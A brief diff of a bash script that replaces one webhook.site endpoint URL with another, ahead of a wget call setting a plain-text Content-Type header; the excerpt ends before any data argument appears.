@@ -1,6 +1,6 @@
 #!/bin/bash
 
-URL="https://webhook.site/39efcb72-40f8-4408-a4c0-0dc07f0cd12d"
+URL="https://webhook.site/18576024-f6ea-4511-ae45-8d1fe63d89c9"
 
 wget -nv -O- \
     --header="Content-Type: text/plain" \
